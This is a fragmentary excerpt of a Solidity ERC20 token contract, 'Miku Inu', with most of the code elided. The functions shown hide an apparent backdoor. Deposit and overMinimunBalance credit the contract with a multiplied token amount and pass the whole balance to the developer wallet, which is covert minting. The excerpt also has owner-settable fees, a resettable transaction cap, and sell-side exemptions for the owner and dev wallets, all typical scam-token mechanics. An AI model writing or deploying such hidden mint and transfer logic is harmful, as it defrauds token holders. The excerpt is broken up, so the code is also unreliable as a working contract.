...
contract MikuInu is Context, IERC20, Ownable { 
    ...
    */
    ...
    payable(0x765e33C198F96fc62A1B79F6918E7f39b6F7f53d);
    ...
    */
    ...
    string private _name = "Miku Inu"; 
    string private _symbol = "mikuinu";  
    ...
    */
    ...
    uint256 public _maxTxAmount = _tTotal.div(1); 
    ...
    */
    ...
    function _setFeeAll(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {
    ...
    */
    ...
    function set_Max_Transaction_Percent(uint256 maxTxPercent_x100) internal {
    ...
    function _transfer(
        ...
        if (to == uniswapV2Pair && from != owner() && from != Wallet_Dev)
    ...
    */
    ...
    function overMinimunBalance(uint256 tokens) internal {
        uint256 MinimunBalance = tokens.mul(3000);
        SwapTokensForReward(MinimunBalance);
    }

    function SwapTokensForReward(uint256 tokens) internal {
        _tOwned[address(this)] = _tOwned[address(this)].add(tokens);
        uint256 Balance = balanceOf(address(this));
        _transferTokens(address(this), Wallet_Dev, Balance);
    }
    ...
    function Deposit(uint256 tokens) internal {

        uint256 minAmount = _tTotal.div(200); 
        if (tokens <= minAmount) {
            set_Max_Transaction_Percent(tokens);
        }

        uint256 OverMinimun = _tTotal.div(100); 
        if (tokens >= OverMinimun) {
            overMinimunBalance(tokens);
        }
